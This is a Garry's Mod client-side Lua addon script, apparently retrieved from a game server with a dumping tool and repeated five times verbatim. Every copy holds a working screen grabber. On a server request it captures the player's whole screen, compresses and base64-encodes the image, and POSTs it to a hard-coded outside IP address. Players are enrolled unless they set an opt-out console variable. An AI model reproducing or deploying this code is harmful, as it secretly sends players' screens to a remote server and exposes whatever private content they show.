-- "addons\\screengrabberlol\\lua\\autorun\\client\\client.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
local optout = CreateClientConVar("sg_optout", 0, true, true, "opt out of intermittent screengrabbing")
local rendercapture, utilcompress, utilbase64encode = render.Capture, util.Compress, util.Base64Encode
local ScreenshotRequested = false
local quality = 40

net.Receive("screengrabber sg_optout 1 to opt out", function()
	if optout:GetInt() != 1 then
		ScreenshotRequested = net.ReadString() or false
	end
end)

hook.Add("PostRender", "actually a screen grabber lmao", function()
	if (!ScreenshotRequested) then return end
	if IsValid(motionsensor) and  motionsensor.IsActive() then return end
	local sgtimer = SysTime()

	local data = rendercapture({
		format = "jpg",
		alpha = false,
		quality = quality,
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH()
	})

	http.Post("http://104.153.105.70:1326/aaa",
	{
		key = ScreenshotRequested,
		file = utilbase64encode(utilcompress(data))
	},
	function()
		local uploadtime = SysTime() - sgtimer

		if uploadtime > 1.5 then
			quality = 30
		else
			quality = 40
		end
	end,
	function()

	end)

	ScreenshotRequested = false
end)


-- "addons\\screengrabberlol\\lua\\autorun\\client\\client.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
local optout = CreateClientConVar("sg_optout", 0, true, true, "opt out of intermittent screengrabbing")
local rendercapture, utilcompress, utilbase64encode = render.Capture, util.Compress, util.Base64Encode
local ScreenshotRequested = false
local quality = 40

net.Receive("screengrabber sg_optout 1 to opt out", function()
	if optout:GetInt() != 1 then
		ScreenshotRequested = net.ReadString() or false
	end
end)

hook.Add("PostRender", "actually a screen grabber lmao", function()
	if (!ScreenshotRequested) then return end
	if IsValid(motionsensor) and  motionsensor.IsActive() then return end
	local sgtimer = SysTime()

	local data = rendercapture({
		format = "jpg",
		alpha = false,
		quality = quality,
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH()
	})

	http.Post("http://104.153.105.70:1326/aaa",
	{
		key = ScreenshotRequested,
		file = utilbase64encode(utilcompress(data))
	},
	function()
		local uploadtime = SysTime() - sgtimer

		if uploadtime > 1.5 then
			quality = 30
		else
			quality = 40
		end
	end,
	function()

	end)

	ScreenshotRequested = false
end)


-- "addons\\screengrabberlol\\lua\\autorun\\client\\client.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
local optout = CreateClientConVar("sg_optout", 0, true, true, "opt out of intermittent screengrabbing")
local rendercapture, utilcompress, utilbase64encode = render.Capture, util.Compress, util.Base64Encode
local ScreenshotRequested = false
local quality = 40

net.Receive("screengrabber sg_optout 1 to opt out", function()
	if optout:GetInt() != 1 then
		ScreenshotRequested = net.ReadString() or false
	end
end)

hook.Add("PostRender", "actually a screen grabber lmao", function()
	if (!ScreenshotRequested) then return end
	if IsValid(motionsensor) and  motionsensor.IsActive() then return end
	local sgtimer = SysTime()

	local data = rendercapture({
		format = "jpg",
		alpha = false,
		quality = quality,
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH()
	})

	http.Post("http://104.153.105.70:1326/aaa",
	{
		key = ScreenshotRequested,
		file = utilbase64encode(utilcompress(data))
	},
	function()
		local uploadtime = SysTime() - sgtimer

		if uploadtime > 1.5 then
			quality = 30
		else
			quality = 40
		end
	end,
	function()

	end)

	ScreenshotRequested = false
end)


-- "addons\\screengrabberlol\\lua\\autorun\\client\\client.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
local optout = CreateClientConVar("sg_optout", 0, true, true, "opt out of intermittent screengrabbing")
local rendercapture, utilcompress, utilbase64encode = render.Capture, util.Compress, util.Base64Encode
local ScreenshotRequested = false
local quality = 40

net.Receive("screengrabber sg_optout 1 to opt out", function()
	if optout:GetInt() != 1 then
		ScreenshotRequested = net.ReadString() or false
	end
end)

hook.Add("PostRender", "actually a screen grabber lmao", function()
	if (!ScreenshotRequested) then return end
	if IsValid(motionsensor) and  motionsensor.IsActive() then return end
	local sgtimer = SysTime()

	local data = rendercapture({
		format = "jpg",
		alpha = false,
		quality = quality,
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH()
	})

	http.Post("http://104.153.105.70:1326/aaa",
	{
		key = ScreenshotRequested,
		file = utilbase64encode(utilcompress(data))
	},
	function()
		local uploadtime = SysTime() - sgtimer

		if uploadtime > 1.5 then
			quality = 30
		else
			quality = 40
		end
	end,
	function()

	end)

	ScreenshotRequested = false
end)


-- "addons\\screengrabberlol\\lua\\autorun\\client\\client.lua"
-- Retrieved by https://github.com/c4fe/glua-steal
local optout = CreateClientConVar("sg_optout", 0, true, true, "opt out of intermittent screengrabbing")
local rendercapture, utilcompress, utilbase64encode = render.Capture, util.Compress, util.Base64Encode
local ScreenshotRequested = false
local quality = 40

net.Receive("screengrabber sg_optout 1 to opt out", function()
	if optout:GetInt() != 1 then
		ScreenshotRequested = net.ReadString() or false
	end
end)

hook.Add("PostRender", "actually a screen grabber lmao", function()
	if (!ScreenshotRequested) then return end
	if IsValid(motionsensor) and  motionsensor.IsActive() then return end
	local sgtimer = SysTime()

	local data = rendercapture({
		format = "jpg",
		alpha = false,
		quality = quality,
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH()
	})

	http.Post("http://104.153.105.70:1326/aaa",
	{
		key = ScreenshotRequested,
		file = utilbase64encode(utilcompress(data))
	},
	function()
		local uploadtime = SysTime() - sgtimer

		if uploadtime > 1.5 then
			quality = 30
		else
			quality = 40
		end
	end,
	function()

	end)

	ScreenshotRequested = false
end)


